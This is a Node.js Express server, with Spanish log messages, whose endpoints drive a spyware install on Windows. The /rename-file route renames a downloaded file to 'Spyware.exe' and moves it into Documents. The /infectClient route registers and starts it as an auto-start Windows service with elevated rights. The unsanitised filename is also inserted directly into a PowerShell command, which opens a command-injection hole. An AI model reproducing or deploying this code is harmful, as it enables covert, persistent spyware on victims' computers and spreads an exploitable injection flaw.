import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { exec } from 'child_process';

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.static(path.join(__dirname)));
app.use(express.json()); // Add this line to parse JSON bodies

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/rename-file', (req, res) => {
  const { filename } = req.body;
  console.log('Renombrando el archivo:', filename);

  // Comando corregido con -Command
  const renameCommand = `powershell.exe -Command "Rename-Item -Path \\"$env:USERPROFILE\\Downloads\\${filename}\\" -NewName \\"Spyware.exe\\""`;
  const moveCommand = `powershell.exe -Command "Move-Item -Path \\"$env:USERPROFILE\\Downloads\\Spyware.exe\\" -Destination \\"$env:USERPROFILE\\Documents\\Spyware.exe\\" -Force"`;


  exec(renameCommand, (err, stdout, stderr) => {
    if (err) {
      console.error('Error al renombrar el archivo:', stderr);
      return res.json({ success: false, error: stderr });
    }
    console.log('Archivo renombrado a Spyware.exe');

    exec(moveCommand, (err, stdout, stderr) => {
      if (err) {
        console.error('Error al mover el archivo:', stderr);
        return res.json({ success: false, error: stderr });
      }
      console.log('Archivo movido a C:\\');
      res.json({ success: true });
    });
  });
});





app.post('/infectClient', (req, res) => {
    try {
        const spywareExePath = path.join(process.env.USERPROFILE, 'Documents', 'Spyware.exe');
        const installServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'create SpywareService binPath= \\"${spywareExePath}\\" start= auto' -Verb runAs"`;
        const startServCmd = `powershell -Command "Start-Process sc.exe -ArgumentList 'start SpywareService' -Verb runAs"`;
        console.log(process.env.USERPROFILE);
        exec(installServCmd, (err, stdout, stderr) => {
            if (err) {
                console.error('Error al instalar el servicio:', err);
                return res.json({ success: false, error: err.message });
            }
            console.log('Servicio instalado correctamente');

        });

        setTimeout(() => {
            exec(startServCmd, (err, stdout, stderr) => {
                if (err) {
                    console.error('Error al iniciar el servicio:', err);
                    return res.json({ success: false, error: err.message });
                }
                console.log('Servicio iniciado correctamente');
            });
        }, 2500);
    } catch (error) {
        console.error('Error al instalar el servicio el archivo:', error);
        return res.json({ success: false, error: error.message });
        
    }
});


const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});